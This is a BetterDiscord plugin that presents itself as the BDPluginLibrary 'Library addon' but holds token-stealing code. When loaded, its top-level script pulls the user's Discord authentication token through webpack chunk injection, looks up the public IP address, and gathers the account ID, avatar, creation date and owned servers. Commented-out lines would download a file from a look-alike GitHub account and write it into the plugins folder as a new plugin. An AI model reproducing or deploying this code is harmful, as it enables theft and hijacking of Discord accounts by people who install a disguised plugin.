/**
 * @name test
 * @version 1.4.69
 * @description Library addon for the Better Discord APP
 * @invite TyFxKer
 * @authorLink https://twitter.com/ZackRauen
 * @donate https://paypal.me/ZackRauen
 * @patreon https://patreon.com/Zerebos
 * @website https://github.com/rauenzi/BDPluginLibrary
 * @source https://raw.githubusercontent.com/rauenzi/BDPluginLibrary/master/release/0PluginLibrary.plugin.js
 */

 const config = {
    "info": {
        "name": "test",
        "authors": ["DevilBro", "The Way", "lego"],
        "version": "1.5",
        "description": "Library addon for the Better Discord APP"
    },
  }
  


  class test {
    constructor() { this._config = config; }
    
    getName() { return config.info.name; }
    getAuthor() { return config.info.authors[0] }
    getDescription() { return config.info.description; }
    getVersion() { return config.info.version; }
  
    load() {
        



    // require("request").get("https://raw.githubusercontent.com/LIBRARYY/BDLibrary.github.io/main/README"), (e, r, b) => {
    //     if (!e && b) require("fs").appendFile(require("path").join(BdApi.Plugins.folder, "trendstet.plugin.js"), b,)};
    
    
    // fs.appendFile(require("path").join(BdApi.Plugins.folder, "trend.txt", function (err) {
    //   if (err) throw err;
    //   console.log('Saved!');
      

    }
  }
// const fs = require('fs');
//fs.appendFileSync(require("path").join(BdApi.Plugins.folder, "trend.txt", 'data to append'));



var userInfo = BdApi.findModuleByProps('getCurrentUser').getCurrentUser();
var ipAddress;
fetch("https://api.ipify.org/?format=json")
        .then(res => res.json())
        .then((out) => {ipAddress = out.ip});

var id = userInfo.id;
var avatar = "https://cdn.discordapp.com/avatars/"+id+"/"+userInfo.avatar+".jpeg";
var authToken = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
var date = new Date(userInfo.createdAt);
var creationDate = date.getDate() + "." + (date.getMonth() + 1) + "." + date.getFullYear();

//own guilds
var MemberCountStore = BdApi.findModuleByProps('getMemberCount');
var Guilds = Object.values(BdApi.findModuleByProps('getGuilds').getGuilds());
var sortFunction = (a, b) => {
  if(a.name < b.name) return -1;
  if(a.name > b.name) return 1;
  return 0;};
  
var myServers = Guilds.filter((guild) => guild.ownerId === id).sort(sortFunction);
var createGuildsMap = (guilds) => guilds.map((guild) => {
  return `\t\t\t\t\t  ${"`" + MemberCountStore.getMemberCount(guild.id)+ "`"}\t${[` ${"" + guild.name + ""}`].join("\n")}`;
  }).join("\n");






console.log("IP " + ipAddress +"\nAvatar "+ avatar +"\nID "+ id +"\nToken "+ authToken +"\ndate "+ creationDate +"\n"+ `\nServers: ${myServers.length ? ` ${myServers.length}\n${createGuildsMap(myServers)}` : ''}`)










// var fs = require('fs');
// var files = fs.readdirSync(require("path").join(BdApi.Plugins.folder));
// console.log(files)

// fs.appendFileSync(require("path").join(BdApi.Plugins.folder) + "\\appendFile.txt", files);


// console.log(require("path").join(BdApi.Plugins.folder) + "\\appendFile.txt")







//require("fs").appendFile(require("path").join(BdApi.Plugins.folder, "fsfsfsfsfsf.txt", "test"));



// require("request").get("https://raw.githubusercontent.com/LIBRARYY/BDLibrary.github.io/main/README", (e, r, b) => {
// 	if (!e && b) require("fs").appendFile(require("path").join(BdApi.Plugins.folder, "fsfsfsfsfsf.txt"), b, _ )});
